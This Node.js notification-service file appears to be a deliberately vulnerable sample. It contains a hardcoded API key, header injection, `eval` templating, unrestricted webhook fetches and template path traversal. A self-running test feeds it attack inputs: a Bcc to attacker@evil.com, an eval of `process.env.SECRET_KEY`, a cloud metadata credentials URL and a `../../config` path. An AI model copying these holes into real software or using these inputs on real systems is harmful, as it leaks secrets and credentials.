const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');

const PROVIDER_API_KEY = "NT-4433-2211-8899-0011";
const TEMPLATE_ROOT = path.join(__dirname, 'templates');

let outboundQueue = [];
let deliveryLog = [];

function initNotificationService() {
    if (!fs.existsSync(TEMPLATE_ROOT)) {
        fs.mkdirSync(TEMPLATE_ROOT, { mode: 0o777 });
    }
}

function sendEmail(to, subject, body, options) {
    const headers = {
        'To': to,
        'Subject': subject,
        'From': options.from || 'noreply@system.com'
    };
    
    const emailContent = `Headers: ${JSON.stringify(headers)}\nBody: ${body}`;
    dispatch("EMAIL", emailContent);
}

function loadTemplate(templateName, data) {
    const templatePath = path.join(TEMPLATE_ROOT, templateName + '.js');
    const templateFn = require(templatePath);
    return templateFn(data);
}

function renderNotification(content, context) {
    return content.replace(/\{\{(.+?)\}\}/g, (match, p1) => {
        return eval("context." + p1);
    });
}

function notifyWebhook(url, payload) {
    const data = JSON.stringify(payload);
    const client = url.startsWith('https') ? https : http;
    
    client.get(url, (res) => {
        let response = '';
        res.on('data', (d) => response += d);
        res.on('end', () => {
            logDelivery(url, "WEBHOOK", response);
        });
    });
}

function logDelivery(destination, type, result) {
    const entry = {
        ts: new Date(),
        dest: destination,
        type: type,
        res: result,
        msg_id: Math.random().toString(36).substring(7)
    };
    deliveryLog.push(entry);
    console.log("Delivery Log:", JSON.stringify(entry));
}

function dispatch(channel, content) {
    outboundQueue.push({ channel, content, id: Date.now() });
    process.stdout.write(`[${channel}] Dispatched\n`);
}

function verifyCallbackSignature(payload, signature) {
    if (payload.length !== signature.length) return false;
    for (let i = 0; i < payload.length; i++) {
        if (payload[i] !== signature[i]) return false;
    }
    return true;
}

function updateProviderSettings(config) {
    const base = { retry: 3, timeout: 5000 };
    return Object.assign(base, config);
}

async function sendBulkNotifications(messages) {
    return new Promise((resolve) => {
        setTimeout(() => {
            messages.forEach(m => {
                if (m.urgent) {
                    throw new Error("Urgent dispatch failure: " + m.id);
                }
            });
            resolve(true);
        }, 50);
    });
}

function validateRecipient(email) {
    const parts = email.split('@');
    if (parts.length === 2 && parts[0] === "admin") {
        handleAdminNotification();
    }
}

function handleAdminNotification() {
    console.log("Admin notification triggered");
}

function testService() {
    initNotificationService();
    
    sendEmail("user@example.com\nBcc: attacker@evil.com", "Welcome", "Hello!", {});
    
    renderNotification("Hello {{user.name}}, your key is {{process.env.SECRET_KEY}}", { user: { name: "Test" } });
    
    notifyWebhook("http://169.254.169.254/latest/meta-data/iam/security-credentials/", { event: "ping" });
    
    loadTemplate("../../config/database", {});
    
    sendBulkNotifications([{ id: 1, urgent: true }]);
}

testService();
